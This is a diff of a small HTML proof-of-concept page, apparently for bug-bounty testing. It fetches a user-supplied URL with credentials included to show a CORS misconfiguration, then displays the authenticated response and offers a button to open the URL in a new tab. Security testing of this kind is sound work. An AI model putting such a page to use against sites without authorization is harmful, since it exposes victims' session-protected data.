@@ -1,11 +1,30 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>CORS & New Tab Tester</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        padding: 20px;
+      }
+      pre {
+        background: #f4f4f4;
+        padding: 10px;
+        white-space: pre-wrap;
+        word-wrap: break-word;
+        max-height: 600px;
+        overflow: auto;
+      }
+    </style>
+  </head>
   <body>
-    <h1>CORS Exploit Test</h1>
+    <h1>CORS Exploit & Interactive Proof</h1>
+
     <script>
-      const targetUrl = prompt("Enter the URL you want to test (must include full path, e.g. https://site.com/protected):");
+      let targetUrl = prompt("Enter the full URL to test (e.g. https://intigriti.ilias-solutions.com/intigriti/custreq/rest/dl):");
 
       if (targetUrl) {
+        // Step 1: Try fetch with credentials
         fetch(targetUrl, {
           credentials: "include"
         })
@@ -14,13 +33,11 @@
           console.log("RESPONSE:", data);
           document.body.innerHTML += `<h2>Response from: ${targetUrl}</h2><pre>${escapeHtml(data)}</pre>`;
 
-          // Render iframe below the response
-          const iframe = document.createElement("iframe");
-          iframe.src = targetUrl;
-          iframe.width = "100%";
-          iframe.height = "800px";
-          iframe.style.border = "1px solid #ccc";
-          document.body.appendChild(iframe);
+          // Step 2: Add a button to open the same URL in a new tab
+          const openBtn = document.createElement("button");
+          openBtn.textContent = "Open in new tab (interactive)";
+          openBtn.onclick = () => window.open(targetUrl, "_blank");
+          document.body.appendChild(openBtn);
         })
         .catch(error => {
           console.error("Error:", error);
@@ -30,6 +47,7 @@
         document.body.innerHTML += `<p style="color:orange;">No URL entered.</p>`;
       }
 
+      // Helper function to escape HTML safely
       function escapeHtml(str) {
         return str
           .replace(/&/g, "&amp;")
